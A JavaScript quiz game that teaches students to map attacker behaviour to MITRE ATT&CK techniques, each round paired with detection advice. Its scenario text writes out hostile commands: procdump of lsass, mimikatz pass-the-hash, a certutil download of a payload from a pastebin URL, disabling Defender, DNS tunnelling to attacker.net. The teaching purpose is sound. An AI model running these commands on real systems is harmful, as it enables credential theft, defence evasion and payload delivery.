/*
 * mitre-match-game.js — E@st3r Egg Cyb3r Ski11 G@m3: MITRE ATT&CK Match (Cyber Student tier)
 *
 * 10 rounds, each presents an attacker-behavior scenario in plain English
 * with 4 ATT&CK technique options. Player picks the right one. Tells explain
 * the match + how the distractors differ.
 *
 * Score: 1 point per round, pass at 80% (8/10).
 *
 * Registers as window.HackMeGame.mitre. Pure DOM (no innerHTML), CSP-safe.
 */
(function () {
  'use strict';

  var rounds = [
    {
      scenario: 'An attacker uses procdump.exe -ma lsass.exe lsass.dmp to extract memory from the Local Security Authority process, then runs Mimikatz offline to pull plaintext passwords and NTLM hashes.',
      options: [
        { id: 'T1003.001', name: 'OS Credential Dumping: LSASS Memory', correct: true },
        { id: 'T1059.001', name: 'Command and Scripting Interpreter: PowerShell', correct: false },
        { id: 'T1078',     name: 'Valid Accounts', correct: false },
        { id: 'T1486',     name: 'Data Encrypted for Impact', correct: false }
      ],
      tells: [
        'Memory of the LSASS process holds credential material for any user with a current logon session — exactly what T1003.001 covers.',
        'T1059.001 (PowerShell) and T1078 (Valid Accounts) are common follow-on techniques, not the act of credential extraction itself.',
        'Detection idea: alert on any process opening a handle to lsass.exe with PROCESS_VM_READ — Sysmon event ID 10 filters this well.'
      ]
    },
    {
      scenario: 'After initial access the attacker creates a Windows scheduled task named "GoogleUpdate" that runs a payload every 30 minutes from a writable temp directory.',
      options: [
        { id: 'T1547.001', name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder', correct: false },
        { id: 'T1053.005', name: 'Scheduled Task/Job: Scheduled Task', correct: true },
        { id: 'T1055',     name: 'Process Injection', correct: false },
        { id: 'T1027',     name: 'Obfuscated Files or Information', correct: false }
      ],
      tells: [
        'Scheduled Task is the textbook persistence-via-task technique (T1053.005). Masquerading it as "GoogleUpdate" is the social engineering on top.',
        'T1547.001 covers Run keys and Startup folder, a different persistence mechanism. T1055 and T1027 do not establish persistence at all.',
        'Detect with Sysmon event ID 1 (Process Create) where parent is svchost.exe -k netsvcs hosting the Schedule service, plus an audit on Security event 4698.'
      ]
    },
    {
      scenario: 'A compromised host issues a steady stream of TXT-record queries to *.attacker.net, each subdomain encoding 30+ bytes of base32. Outbound DNS volume from this host is 50× its baseline.',
      options: [
        { id: 'T1071.001', name: 'Application Layer Protocol: Web Protocols', correct: false },
        { id: 'T1071.004', name: 'Application Layer Protocol: DNS', correct: true },
        { id: 'T1041',     name: 'Exfiltration Over C2 Channel', correct: false },
        { id: 'T1090',     name: 'Proxy', correct: false }
      ],
      tells: [
        'DNS over UDP/53 is often allowed outbound where HTTP is filtered — perfect cover for C2. T1071.004 is the ATT&CK technique for using DNS as the application-layer protocol.',
        'T1041 (Exfiltration Over C2) describes data leaving via an existing C2 channel; here the focus is the establishment of the C2 itself.',
        'Detection: track per-host DNS-query rate, unique-subdomain entropy, and response sizes. Tools like Suricata DNS logs, Zeek dns.log, or Splunk threathunting apps.'
      ]
    },
    {
      scenario: 'A PowerShell process spawns certutil.exe -urlcache -split -f https://pastebin.com/raw/AbC123 payload.exe to download a second-stage binary.',
      options: [
        { id: 'T1105', name: 'Ingress Tool Transfer', correct: true },
        { id: 'T1190', name: 'Exploit Public-Facing Application', correct: false },
        { id: 'T1218', name: 'System Binary Proxy Execution', correct: false },
        { id: 'T1140', name: 'Deobfuscate/Decode Files or Information', correct: false }
      ],
      tells: [
        'Bringing a tool from an attacker-controlled location into the victim is T1105. certutil.exe is a signed Microsoft binary commonly abused for this — a living-off-the-land binary (LOLBin).',
        'T1218 (System Binary Proxy Execution) overlaps but specifically covers using signed binaries to EXECUTE payloads (e.g., regsvr32 running a .sct). Downloading is T1105.',
        'Detection: alert on any non-CA process command line containing "certutil -urlcache" or "certutil -decode". Almost always malicious in production.'
      ]
    },
    {
      scenario: 'Attacker uses a captured NTLM hash with mimikatz "sekurlsa::pth /user:admin /domain:CORP /ntlm:..." to authenticate to a file server without ever cracking the plaintext password.',
      options: [
        { id: 'T1003.001', name: 'OS Credential Dumping: LSASS Memory', correct: false },
        { id: 'T1078',     name: 'Valid Accounts', correct: false },
        { id: 'T1550.002', name: 'Use Alternate Authentication Material: Pass the Hash', correct: true },
        { id: 'T1021.002', name: 'Remote Services: SMB/Windows Admin Shares', correct: false }
      ],
      tells: [
        'Pass-the-Hash (T1550.002) authenticates with the hash itself as the credential, bypassing the need to recover the cleartext password.',
        'T1003.001 is how the hash was originally stolen. T1021.002 is the SMB-based lateral movement that often follows. T1078 is the broader category of using valid creds.',
        'Mitigation: enforce Credential Guard on Windows 10/11, segment admin accounts via tiered admin model, monitor 4624 logons with package=NTLM for sensitive accounts.'
      ]
    },
    {
      scenario: 'A user receives an email with a malicious .docm attachment. Opening it triggers an embedded VBA macro that downloads and executes a Cobalt Strike beacon.',
      options: [
        { id: 'T1566.001', name: 'Phishing: Spearphishing Attachment', correct: true },
        { id: 'T1059.005', name: 'Command and Scripting Interpreter: Visual Basic', correct: false },
        { id: 'T1204.002', name: 'User Execution: Malicious File', correct: false },
        { id: 'T1106',     name: 'Native API', correct: false }
      ],
      tells: [
        'The initial-access vector is the attachment delivery — T1566.001. ATT&CK distinguishes the delivery (Phishing), the user action (T1204.002), and the macro execution (T1059.005); the question asks for the entry technique.',
        'A complete chain often gets all three IDs in a report. Knowing which is "primary" helps when you can only tag one.',
        'Detection: block .docm at the gateway, alert on Office spawning powershell/cmd/wscript/cscript, enforce Mark-of-the-Web on internet-sourced docs.'
      ]
    },
    {
      scenario: 'Attacker runs Set-MpPreference -DisableRealtimeMonitoring $true from elevated PowerShell before deploying further tools.',
      options: [
        { id: 'T1562.001', name: 'Impair Defenses: Disable or Modify Tools', correct: true },
        { id: 'T1112',     name: 'Modify Registry', correct: false },
        { id: 'T1070',     name: 'Indicator Removal', correct: false },
        { id: 'T1548',     name: 'Abuse Elevation Control Mechanism', correct: false }
      ],
      tells: [
        'Turning off Microsoft Defender real-time monitoring is the canonical T1562.001 example — disabling a security tool to allow follow-on activity.',
        'T1112 (Registry) and T1070 (Indicator Removal) might co-occur but are about different actions; T1548 is about bypassing UAC/EoP, not blinding defenses.',
        'Detection: alert on Set-MpPreference with DisableRealtimeMonitoring=$true, plus on Defender service stop (event 5001) or tampering events (1116, 1117).'
      ]
    },
    {
      scenario: 'Attacker compresses sensitive documents into temp.zip inside C:\\ProgramData\\Microsoft\\Temp\\ before uploading to a Mega.nz endpoint.',
      options: [
        { id: 'T1041',     name: 'Exfiltration Over C2 Channel', correct: false },
        { id: 'T1074.001', name: 'Data Staged: Local Data Staging', correct: true },
        { id: 'T1560.001', name: 'Archive Collected Data: Archive via Utility', correct: false },
        { id: 'T1567.002', name: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage', correct: false }
      ],
      tells: [
        'Local Data Staging (T1074.001) is the gathering step before exfil — collecting files into a single bundle on the victim host.',
        'T1560.001 is the act of zipping itself; T1567.002 is the exfil to Mega. Real intrusions chain all three — pick the one the question highlights (the staging directory).',
        'Detection: look for archive utilities in unusual paths, single processes touching large numbers of distinct files, then immediate egress to file-sharing TLS SNIs.'
      ]
    },
    {
      scenario: 'Attacker requests service tickets (TGS) for AD accounts that have SPNs set, then cracks the encrypted ticket offline to recover the service account password.',
      options: [
        { id: 'T1110.003', name: 'Brute Force: Password Spraying', correct: false },
        { id: 'T1558.003', name: 'Steal or Forge Kerberos Tickets: Kerberoasting', correct: true },
        { id: 'T1003.006', name: 'OS Credential Dumping: DCSync', correct: false },
        { id: 'T1078.002', name: 'Valid Accounts: Domain Accounts', correct: false }
      ],
      tells: [
        'Kerberoasting (T1558.003) abuses any authenticated user\'s ability to request a TGS for any SPN. The TGS is encrypted with the service account\'s NT hash — crackable offline.',
        'T1110.003 is online password spraying — fundamentally different. T1003.006 (DCSync) abuses replication, not Kerberos.',
        'Mitigation: long random passwords (25+ chars) on every SPN account, switch to gMSA where possible, monitor 4769 events with RC4 ticket encryption.'
      ]
    },
    {
      scenario: 'After establishing persistence and exfiltrating data, the attacker deploys a binary that uses AES-256 to encrypt files on shared drives, appends a .LOCKED extension, and drops a ransom note in every directory.',
      options: [
        { id: 'T1486', name: 'Data Encrypted for Impact', correct: true },
        { id: 'T1490', name: 'Inhibit System Recovery', correct: false },
        { id: 'T1485', name: 'Data Destruction', correct: false },
        { id: 'T1565', name: 'Data Manipulation', correct: false }
      ],
      tells: [
        'Ransomware encryption to deny access until payment is the textbook T1486 — "Impact" tactic, specifically "Data Encrypted for Impact".',
        'T1490 is the secondary technique most ransomware uses (vssadmin delete shadows, etc.). T1485 destroys data outright; T1565 alters it stealthily.',
        'Detection: file-rename storm patterns, file-extension changes at scale, and process-to-network behavior tied to known ransomware family TTPs.'
      ]
    }
  ];

  var PASS_PCT = 80;
  var state = null;

  function clear(el) { while (el.firstChild) el.removeChild(el.firstChild); }
  function el(tag, className, text) {
    var n = document.createElement(tag);
    if (className) n.className = className;
    if (text != null) n.textContent = text;
    return n;
  }

  function start(host, onComplete) {
    state = { host: host, onComplete: onComplete, current: 0, score: 0 };
    renderRound();
  }
  function cleanup() { state = null; }

  function renderRound() {
    if (!state) return;
    clear(state.host);
    var round = rounds[state.current];

    var wrap = el('div', 'mitre-match-game');
    var card = el('div', 'mt-card');

    var header = el('div', 'mt-header');
    var progress = el('div', 'mt-progress');
    progress.appendChild(document.createTextNode('Round '));
    progress.appendChild(el('strong', null, String(state.current + 1)));
    progress.appendChild(document.createTextNode(' of ' + rounds.length));
    var score = el('div', 'mt-score');
    score.appendChild(document.createTextNode('Score: '));
    score.appendChild(el('strong', null, String(state.score)));
    header.appendChild(progress);
    header.appendChild(score);
    card.appendChild(header);

    card.appendChild(el('div', 'mt-label', 'Attacker behavior:'));
    card.appendChild(el('div', 'mt-scenario', round.scenario));

    card.appendChild(el('div', 'mt-label mt-options-label', 'Pick the ATT&CK technique:'));

    var optsBox = el('div', 'mt-options');
    round.options.forEach(function (opt, idx) {
      var btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'mt-option-btn';
      btn.setAttribute('data-idx', String(idx));
      btn.appendChild(el('span', 'mt-option-id', opt.id));
      btn.appendChild(el('span', 'mt-option-name', opt.name));
      btn.addEventListener('click', function () { answer(idx); });
      optsBox.appendChild(btn);
    });
    card.appendChild(optsBox);

    wrap.appendChild(card);
    state.host.appendChild(wrap);
  }

  function answer(pickedIdx) {
    if (!state) return;
    var round = rounds[state.current];
    var correctIdx = round.options.findIndex(function (o) { return o.correct; });
    var correct = pickedIdx === correctIdx;
    if (correct) state.score++;
    showFeedback(correct, pickedIdx, correctIdx, round);
  }

  function showFeedback(correct, pickedIdx, correctIdx, round) {
    var card = state.host.querySelector('.mt-card');
    if (!card) return;

    var btns = card.querySelectorAll('.mt-option-btn');
    for (var i = 0; i < btns.length; i++) {
      btns[i].disabled = true;
      var idx = parseInt(btns[i].getAttribute('data-idx'), 10);
      if (idx === correctIdx) btns[i].classList.add('mt-option-correct');
      if (idx === pickedIdx && idx !== correctIdx) btns[i].classList.add('mt-option-wrong');
    }

    var feedback = el('div', 'mt-feedback ' + (correct ? 'correct' : 'incorrect'));
    feedback.setAttribute('role', 'status');
    feedback.setAttribute('aria-live', 'polite');

    var heading = el('div', 'mt-feedback-heading');
    heading.appendChild(el('span', 'mt-feedback-icon', correct ? '✓' : '✗'));
    heading.appendChild(el('span', 'mt-feedback-text',
      correct ? 'Correct. ' + round.options[correctIdx].id + ' — ' + round.options[correctIdx].name
              : 'Not quite. The answer was ' + round.options[correctIdx].id + ' — ' + round.options[correctIdx].name));
    feedback.appendChild(heading);

    var ul = el('ul', 'mt-tells');
    for (var j = 0; j < round.tells.length; j++) {
      ul.appendChild(el('li', null, round.tells[j]));
    }
    feedback.appendChild(ul);

    card.appendChild(feedback);

    var next = document.createElement('button');
    next.type = 'button';
    next.className = 'mt-btn mt-btn-next';
    next.textContent = state.current < rounds.length - 1 ? 'Next →' : 'See results';
    next.addEventListener('click', function () {
      state.current++;
      if (state.current < rounds.length) {
        renderRound();
        state.host.scrollIntoView({ behavior: 'smooth', block: 'start' });
      } else {
        renderResults();
      }
    });
    card.appendChild(next);

    var scoreStrong = card.querySelector('.mt-score strong');
    if (scoreStrong) scoreStrong.textContent = String(state.score);

    feedback.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  function renderResults() {
    if (!state) return;
    clear(state.host);
    var pct = Math.round((state.score / rounds.length) * 100);
    var message;
    if (pct === 100) message = 'Perfect score. ATT&CK navigator-ready.';
    else if (pct >= PASS_PCT) message = 'Strong. You can map attacker behavior to technique IDs reliably.';
    else if (pct >= 60) message = 'Decent. Drill the technique subcategories you missed.';
    else message = 'Worth another round. Bookmark attack.mitre.org and skim the technique pages.';

    var wrap = el('div', 'mitre-match-game');
    var card = el('div', 'mt-card mt-results');

    var scoreLine = el('div', 'mt-results-score');
    scoreLine.appendChild(el('strong', null, String(state.score)));
    scoreLine.appendChild(document.createTextNode(' / ' + rounds.length));
    card.appendChild(scoreLine);
    card.appendChild(el('div', 'mt-results-pct', pct + '%'));
    card.appendChild(el('div', 'mt-results-message', message));

    var replay = document.createElement('button');
    replay.type = 'button';
    replay.className = 'mt-btn mt-btn-replay';
    replay.textContent = 'Try again';
    replay.addEventListener('click', function () {
      state.current = 0;
      state.score = 0;
      renderRound();
      state.host.scrollIntoView({ behavior: 'smooth', block: 'start' });
    });
    card.appendChild(replay);

    wrap.appendChild(card);
    state.host.appendChild(wrap);

    if (typeof state.onComplete === 'function') state.onComplete(pct);
  }

  window.HackMeGame = window.HackMeGame || {};
  window.HackMeGame.mitre = { start: start, cleanup: cleanup };
})();
